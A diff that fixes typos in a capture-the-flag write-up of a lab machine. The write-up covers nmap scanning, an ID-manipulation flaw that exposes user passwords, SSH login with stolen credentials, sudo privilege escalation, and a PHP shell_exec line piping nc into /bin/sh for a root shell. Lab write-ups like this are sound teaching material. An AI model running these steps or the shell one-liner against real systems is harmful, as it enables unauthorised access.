@@ -13,15 +13,15 @@ masscan -p80 192.168.1.0/24
 
 I noticed that only 2 target as available. As one of that is my default gateway i decide to can 192.168.1.73. In your case... 99% IP address will be different.
 
-I decide to to full scan againts this machine. I used nmap
+I decide to to full scan against this machine. I used nmap
 ```
 nmap -A -sV -T4 -p- 192.168.1.73
 ```
-I used these options as -A will give you os datection and script scanning. Always use -sV to get version detection. I know that -A -sV are same so dont judge :) Option -T4 is more aggresive scanning that normal. and -p- is shortcut to scan all ports.
+I used these options as -A will give you os detection and script scanning. Always use -sV to get version detection. I know that -A -sV are same so don't judge :) Option -T4 is more aggressive scanning that normal. and -p- is shortcut to scan all ports.
 
 ![](/images/vuln_me_girlfriend/nmap_full_scan.png)
 
-As you can see from output only port 80 and 22 are open. I decide to explore port 80. I lunched webbrowser and get some 'felling' how web sites is looking. 
+As you can see from output only port 80 and 22 are open. I decide to explore port 80. I lunched web browser and get some 'felling' how web sites is looking. 
 
 ![](/images/vuln_me_girlfriend/webpage_index.png)
 
@@ -31,7 +31,7 @@ After register i was able to log in and was redirect to home page as register us
 ![](/images/vuln_me_girlfriend/test_profile.png)
 
 As you can see from url there is ID=14. I decide to change to 1 and BINGO. I was able to see profiles of other users. 
-You could decide to check every user and grab his/her username and password. Them you can run hydra against port 22. But as from describtion of this machine Alice was person who was hiding something. I found Alice profile and decide to use her credentials to login into machine...
+You could decide to check every user and grab his/her username and password. Them you can run hydra against port 22. But as from description of this machine Alice was person who was hiding something. I found Alice profile and decide to use her credentials to login into machine...
 
 ![](/images/vuln_me_girlfriend/ssh_login.png)
 
@@ -39,7 +39,7 @@ I was in. With little poking around Alice has hidden folder with all her secrets
 
 ![](/images/vuln_me_girlfriend/flag_1.png)
 
-After start looking for priviledge escalation as start searching for some sticky bits or some clues. Them after reading few linux simple priviledge escalation tricks. I tried this command
+After start looking for privilege escalation as start searching for some sticky bits or some clues. Them after reading few linux simple privilege escalation tricks. I tried this command
 
 ```
 sudo -l
@@ -71,7 +71,7 @@ and hurray got second flag...
 
 ![](/images/vuln_me_girlfriend/flag_2.png)
 
-That's it all, right? Well i was happy i pwned this machine but them i asked my self. Can I used this priviledge escalation misconfiguration to get proper root shell? Challange accepted. I know you can use nc and -e to bind bash to you but version nc on that machine was did not have -e. After asking my search engine for help. I was able to find article where this exact nc version can be use to get access to shell. I changed my shell to this one.
+That's it all, right? Well i was happy i pwned this machine but them i asked my self. Can I used this privilege escalation misconfiguration to get proper root shell? Challenge accepted. I know you can use nc and -e to bind bash to you but version nc on that machine was did not have -e. After asking my search engine for help. I was able to find article where this exact nc version can be use to get access to shell. I changed my shell to this one.
 
 ```php
 <?php
@@ -80,7 +80,7 @@ $a = shell_exec('nc localhost 4444 0<f | /bin/sh -i 2>&1 | tee -f');
 ?>
 ```
 
-Run 'screen' commnad to have to virtual sessions. Lunch nc to listen on port 4444. Move to second session and run my php file. BAAAM i have root shell :) 
+Run 'screen' command to have to virtual sessions. Lunch nc to listen on port 4444. Move to second session and run my php file. BAAAM i have root shell :) 
 
 ![](/images/vuln_me_girlfriend/root_shell.png)
 
